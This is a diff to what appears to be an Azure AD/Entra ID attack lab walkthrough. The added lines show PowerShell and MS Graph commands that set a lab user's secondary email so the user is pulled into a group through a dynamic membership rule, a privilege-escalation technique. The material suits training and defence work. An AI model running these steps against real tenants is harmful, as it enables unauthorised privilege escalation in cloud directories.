@@ -1410,13 +1410,18 @@ $creds = New-Object System.Management.Automation.PSCredential('studentx@defcorpe
 Connect-AzAccount -Credential $creds -TenantId b6e0615d-2c17-46b3-922c-491c91624acd 
 ```
 
+Now, to abuse Dynamic group rule, we need to edit the secondary email for the studentx. Let's do that using the below command.
+Get the ObjectId using the user Thomas by looking at profile of studentx. Remember to replace the UserPrincipalName and ObjectId: 
+```
+Update-MgUser -UserId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com
+```
+
+
+OR MS Graph:
 ```
 $Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token 
 Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
 ```
-
-Now, to abuse Dynamic group rule, we need to edit the secondary email for the studentx. Let's do that using the below command.
-Get the ObjectId using the user Thomas by looking at profile of studentx. Remember to replace the UserPrincipalName and ObjectId: 
 ```
 Update-MgUser -UserId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com
 ```
